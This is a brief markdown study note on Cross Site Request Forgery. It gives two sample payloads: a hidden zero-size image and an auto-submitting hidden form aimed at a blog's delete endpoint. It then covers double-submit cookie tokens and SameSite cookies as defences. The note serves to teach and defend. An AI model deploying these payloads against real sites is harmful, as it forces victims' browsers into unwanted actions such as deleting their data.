# Cross Site Request Forgery (CSRF)
> one-click attack
## Sample Code
### Case 1.
```
<img src='https://small-min.blog.com/delete?id=3' width='0' height='0' />
<a href='/test'>Start your test !</a>
```
### Case 2.
```
<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='https://small-min.blog.com/delete' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='id' value='3'>
  <input type='submit' value='submit'>
</form>
<script>document.getElementById("csrf-form").submit()</script>
```

## How to prevent it ?
### Double Submit Cookie
> the csrf token will be different between request and cookie
```
// `xsrfCookieName` is the name of the cookie to use as a value for xsrf token
xsrfCookieName: 'XSRF-TOKEN', // default

// `xsrfHeaderName` is the name of the http header that carries the xsrf token value
xsrfHeaderName: 'X-XSRF-TOKEN', // default
```
### SameSite cookie
```
Set-Cookie: session_id=ewfewjf23o1; SameSite=Strict
Set-Cookie: foo=bar; SameSite=Lax
```

# Reference
- https://blog.techbridge.cc/2017/02/25/csrf-introduction/

